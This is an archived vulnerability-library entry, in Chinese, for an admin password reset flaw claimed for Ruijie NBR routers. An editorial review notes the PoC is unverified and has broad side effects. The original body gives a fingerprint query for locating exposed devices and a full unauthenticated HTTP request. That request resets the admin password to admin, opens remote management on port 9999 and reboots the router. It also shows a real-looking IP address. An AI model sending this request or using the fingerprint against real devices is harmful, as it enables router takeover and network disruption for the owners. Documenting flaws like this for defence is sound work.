---
source: "wy876 漏洞文库"
id: "vw-b47608a7f6cb46b80feafc14"
entity_id: "ve-b47608a7f6cb46b80feafc14"
schema_version: "1"
title: "锐捷NBR系列多款路由器存在管理员密码重置漏洞"
product: "宣称Ruijie NBR，界面归属待核"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "空密码自声明userid Cookie；型号固件未列"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7NBR%E7%B3%BB%E5%88%97%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中还涉及重启、账户/SSH、防火墙或根目录配置变更；逐步核对具体命令及恢复方式，避免影响管理通道或业务网络"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/em4uexuiwqtgq0ey"
source_status: "recorded"
---

# 锐捷NBR系列多款路由器存在管理员密码重置漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：宣称Ruijie NBR，界面归属待核
- 本文讨论：base_network.asp管理员密码/网络设置未授权变更
- 版本、权限与配置前提：空密码自声明userid Cookie；型号固件未列
- 资料类型：配置重置PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 请求除改密码还reboot=1、启用远程管理/9999端口和NTP重启，副作用远超标题
- 正文无响应/登录证据，通用base_network.asp及wys_userid模板不能据标题确认品牌
- isbase64=1却密码明文未解释
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中还涉及重启、账户/SSH、防火墙或根目录配置变更；逐步核对具体命令及恢复方式，避免影响管理通道或业务网络

### 待核与来源

- 准确设备型号/固件、Cookie边界和base64语义待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷NBR 路由器系统存在存在管理员密码重置漏洞，攻击者通过漏洞重置密码登录后台</font>  
**二、影响版本**

Ruijie-NBR路由器

**三、资产测绘**

```plain
body="上层网络出现异常，请检查外网线路或联系ISP运营商协助排查"
```


  
**四、漏洞复现**

```http
GET /base_network.asp?isbase64=1&reboot=1&shortset=1&time_type=auto&exec_service=ntpc-restart&http_lanport=80&remote_management=1&http_wanport=9999&http_username=admin&http_gname_en=0&http_passwd=admin&_= HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Referer: 111.59.193.189:9999/index.htm?_1708839153
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wys_userid=; userid=admin; gw_userid=admin,gw_passwd=
Connection: close
```


```plain
使用admin/admin登录系统
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/em4uexuiwqtgq0ey>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
